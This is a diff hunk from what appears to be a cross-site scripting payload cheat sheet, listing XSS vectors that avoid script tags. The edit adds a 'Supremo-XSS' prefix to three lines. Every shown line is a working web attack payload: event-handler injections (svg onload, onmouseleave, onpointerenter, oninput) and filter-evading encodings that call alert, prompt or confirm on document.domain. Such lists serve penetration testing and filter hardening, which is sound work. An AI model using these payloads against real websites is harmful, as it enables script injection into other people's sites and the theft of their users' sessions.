@@ -199,9 +199,9 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   "><svg onload=prompt&#0000000040document.domain)>
   "><svg onload=alert%26%230000000040"1")>
   "><svg onload=prompt%26%23x000000028;document.domain)>
-  XSS"><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
-  XSS"><html><select %00 onControl onpointerenter=prompt(domain) hello>
-  XSS"><input %00 onControl hello oninput=confirm(domain) x>
+  Supremo-XSS"><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
+  Supremo-XSS"><html><select %00 onControl onpointerenter=prompt(domain) hello>
+  Supremo-XSS"><input %00 onControl hello oninput=confirm(domain) x>
   "()%26%25<acx><ScRiPt%20>N8Zn(9266)</ScRiPt>
   <fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`>
   '`&quot;&gt;<svg onmouseover=confirm(document.domain)>
